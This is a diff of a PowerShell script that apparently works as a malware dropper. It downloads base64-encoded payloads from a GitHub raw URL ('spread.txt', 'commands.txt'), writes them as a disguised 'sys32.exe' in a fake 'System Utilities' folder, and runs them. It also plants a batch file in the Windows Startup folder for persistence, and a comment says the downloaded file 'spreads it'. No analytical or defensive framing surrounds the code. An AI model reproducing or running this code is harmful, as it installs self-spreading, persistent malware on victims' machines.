@@ -213,27 +213,6 @@ else{
     }
 
 }
-# download a file that spreads it
-$spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread.txt"
-$b64 = iwr -Uri $spreadUrl
-$decoded = $decodedBytes = [System.Convert]::FromBase64String($b64.Content)
-
-# Specify the path where the .exe should be saved
-$deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
-$exeFileName = "sys32.exe"
-$fullExePath = Join-Path $deepExtractPath $exeFileName
-
-# Ensure the target directory exists
-if (-not (Test-Path $deepExtractPath)) {
-    New-Item -ItemType Directory -Force -Path $deepExtractPath
-}
-
-# Write the decoded bytes to the file
-[System.IO.File]::WriteAllBytes($fullExePath, $decodedBytes)
-
-# Provide feedback to the user
-Write-Host "Executable saved to $fullExePath"
-
 # Optionally, run the saved executable (if needed)
 Start-Process $fullExePath
 $spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/commands.txt"
@@ -261,3 +240,23 @@ Start-Process $fullExePath
 
 $content = iwr "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/p.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sys32.bat"
 
+# download a file that spreads it
+$spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread.txt"
+$b64 = iwr -Uri $spreadUrl
+$decoded = $decodedBytes = [System.Convert]::FromBase64String($b64.Content)
+
+# Specify the path where the .exe should be saved
+$deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
+$exeFileName = "sys32.exe"
+$fullExePath = Join-Path $deepExtractPath $exeFileName
+
+# Ensure the target directory exists
+if (-not (Test-Path $deepExtractPath)) {
+    New-Item -ItemType Directory -Force -Path $deepExtractPath
+}
+
+# Write the decoded bytes to the file
+[System.IO.File]::WriteAllBytes($fullExePath, $decodedBytes)
+
+# Provide feedback to the user
+Write-Host "Executable saved to $fullExePath"
